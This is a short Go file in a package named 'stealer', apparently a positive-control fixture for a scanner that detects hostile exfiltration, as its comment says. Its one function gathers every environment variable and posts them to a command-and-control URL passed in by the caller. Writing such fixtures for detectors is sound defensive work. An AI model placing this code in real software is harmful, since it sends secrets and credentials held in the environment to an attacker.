package stealer

import (
	"net/http"
	"net/url"
	"os"
	"strings"
)

// Positive control: environment contents posted to an external collector
// with no localhost-orchestration or vendor context must still trip the
// hostile exfiltration composite.
func exfiltrate(c2 string) {
	env := strings.Join(os.Environ(), "\n")
	http.PostForm(c2, url.Values{"env": {env}})
}
